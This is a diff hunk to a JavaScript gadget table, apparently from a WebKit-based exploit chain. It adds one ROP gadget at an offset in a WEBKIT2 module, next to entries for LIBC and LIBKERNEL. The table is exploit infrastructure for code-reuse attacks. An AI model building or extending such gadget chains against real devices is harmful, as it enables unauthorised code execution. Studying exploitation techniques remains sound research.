@@ -58,6 +58,7 @@ var gadgets = {
 	"mov rdx, rdi": new gadget([0x48, 0x89, 0xfa], LIBC, 0x860f),
 	
 	"add ah, byte [rax]": new gadget([], WEBKIT2, 0x9f98c8),
+	"add edi, dword [rcx]": new gadget([], WEBKIT2, 0xa12cb2),
 	
 	"call rax": new gadget([], LIBKERNEL, 0x48),
 	"call rbx": new gadget([], LIBKERNEL, 0x6143),
